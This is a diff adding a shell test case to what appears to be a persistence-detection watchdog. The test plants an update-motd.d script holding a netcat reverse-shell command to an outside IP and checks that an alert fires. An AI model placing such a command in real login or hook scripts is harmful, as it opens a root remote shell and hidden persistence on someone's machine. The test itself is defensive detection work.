@@ -234,3 +234,20 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in motd script: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks nc reverse-
+    # shell variant INVARIANTs across the brain. Lock the netcat axis
+    # on the login-message-triggered root-exec persistence surface
+    # (T1546.004 — pam_motd runs update-motd.d scripts AS ROOT around
+    # every interactive login).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/00-header"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
